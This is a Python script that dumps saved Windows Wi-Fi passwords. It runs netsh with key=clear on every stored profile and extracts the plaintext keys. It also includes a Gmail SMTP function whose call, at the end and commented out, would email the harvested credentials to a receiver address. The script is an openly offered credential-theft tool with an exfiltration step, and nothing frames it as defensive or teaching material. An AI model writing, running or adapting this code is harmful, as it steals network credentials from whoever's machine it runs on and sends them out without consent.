import subprocess, smtplib, re

def send_email(sender_mail, reciever_mail, password, mail_content):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_mail, password)
    server.sendmail(from_addr=sender_mail, to_addrs=reciever_mail, msg=mail_content)
    server.quit()


find_networks_command = 'netsh wlan show profile'
networks = subprocess.check_output(find_networks_command, shell=True)

pattern = r"\s*All User Profile\s*:\s*"
networks_names = re.split(pattern, str(networks))
networks_name_list = list(filter(None, networks_names))

all_results = {}
for network_name in networks_name_list[1:]:

    network_name = network_name.split('\\')[0]  # it turns TURKNET_B0A44\r\n to TURKNET_B0A44
    command = f"netsh wlan show profile \"{str(network_name)}\" key=clear"

    try:
        current_result = subprocess.check_output(command, shell=True, text=True)

        match = re.search(r'Key Content\s+:\s+(\w+)', current_result)

        if match:
            password = match.group(1)
            print(f"{network_name} : {password}" )
        else:
            print(f"{network_name} : Key Content not found.")

        all_results[network_name] = password

    except:
        print('network_name : ', network_name)
        print('command : ', command)

print(all_results)

#send_email(sender_mail='', reciever_mail='', password='', mail_content=str(all_results))